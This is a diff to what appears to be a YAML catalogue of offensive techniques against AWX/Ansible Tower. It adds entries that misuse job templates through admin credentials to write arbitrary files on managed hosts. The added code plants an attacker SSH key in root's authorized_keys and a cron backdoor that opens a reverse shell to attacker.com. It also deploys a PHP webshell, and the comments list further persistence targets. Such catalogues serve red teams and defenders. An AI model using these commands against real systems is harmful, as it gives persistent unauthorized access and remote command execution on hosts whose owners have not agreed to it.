@@ -61,6 +61,58 @@ functions:
     contexts:
       admin:
     platform: linux
+  file-write:
+  - code: |
+      # Write arbitrary files to managed hosts via ansible.builtin.copy in a job template
+      # Playbook (write.yml) in the project Git repo:
+      # ---
+      # - hosts: all
+      #   gather_facts: false
+      #   tasks:
+      #     - name: write file
+      #       ansible.builtin.copy:
+      #         content: "{{ file_content }}"
+      #         dest: "{{ file_path }}"
+      #         mode: '0600'
+
+      # Launch with extra_vars to write an SSH authorized_keys file:
+      JOB=$(curl -s -X POST "http://victim.com/api/v2/job_templates/<template_id>/launch/" \
+        -H "Content-Type: application/json" \
+        -u "admin:admin" \
+        -d '{
+          "extra_vars": {
+            "file_path": "/root/.ssh/authorized_keys",
+            "file_content": "ssh-ed25519 AAAA...attacker_pubkey... attacker\n"
+          }
+        }' | python3 -c "import sys,json; print(json.load(sys.stdin)['id'])")
+
+      # Confirm via job output:
+      sleep 5
+      curl -s "http://victim.com/api/v2/jobs/$JOB/stdout/?format=txt" -u "admin:admin"
+
+      # Write a cron backdoor on a managed host:
+      curl -s -X POST "http://victim.com/api/v2/job_templates/<template_id>/launch/" \
+        -H "Content-Type: application/json" \
+        -u "admin:admin" \
+        -d '{
+          "extra_vars": {
+            "file_path": "/etc/cron.d/backdoor",
+            "file_content": "* * * * * root bash -i >& /dev/tcp/attacker.com/12345 0>&1\n"
+          }
+        }'
+    comment: |
+      Uses ansible.builtin.copy to write arbitrary content to managed hosts via
+      a job template. Privileged targets depend on the SSH credential configured
+      in the Machine Credential (often root or a privileged service account).
+      Useful write targets on managed hosts:
+      - /root/.ssh/authorized_keys  (persistent SSH access)
+      - /etc/cron.d/backdoor        (cron-based persistence)
+      - /var/www/html/shell.php     (PHP webshell if Apache/Nginx serves PHP)
+      For the AWX execution node itself, use a Job Template with a localhost
+      inventory and connection: local in the playbook.
+    contexts:
+      admin:
+    platform: linux
   rce:
   - code: |
       # Step 1: create a project pointing to an attacker-controlled Git repository
@@ -208,6 +260,35 @@ functions:
       Target cloud IMDS (AWS 169.254.169.254, GCP metadata.google.internal) to retrieve
       IAM credentials, or probe internal Kubernetes API servers, databases, and other
       services not accessible from the attacker's network.
+    contexts:
+      admin:
+    platform: linux
+  webshell:
+  - code: |
+      # Deploy a PHP webshell to a managed web host via ansible.builtin.copy
+      # Requires the managed host to run Apache/Nginx serving PHP
+
+      JOB=$(curl -s -X POST "http://victim.com/api/v2/job_templates/<template_id>/launch/" \
+        -H "Content-Type: application/json" \
+        -u "admin:admin" \
+        -d '{
+          "extra_vars": {
+            "file_path": "/var/www/html/shell.php",
+            "file_content": "<?php if(isset($_REQUEST[\"c\"])){echo shell_exec($_REQUEST[\"c\"]);} ?>"
+          }
+        }' | python3 -c "import sys,json; print(json.load(sys.stdin)['id'])")
+
+      sleep 5
+      curl -s "http://victim.com/api/v2/jobs/$JOB/stdout/?format=txt" -u "admin:admin"
+
+      # Access the webshell on the managed host:
+      curl "http://<managed-host>/shell.php?c=id"
+    comment: |
+      Writes a PHP webshell to the document root of a managed host running
+      Apache or Nginx with PHP enabled, using ansible.builtin.copy via a
+      job template. Replace <managed-host> with the target inventory host.
+      Access at: http://<managed-host>/shell.php?c=id
+      The webshell executes as the web server user (www-data, apache, or daemon).
     contexts:
       admin:
     platform: linux
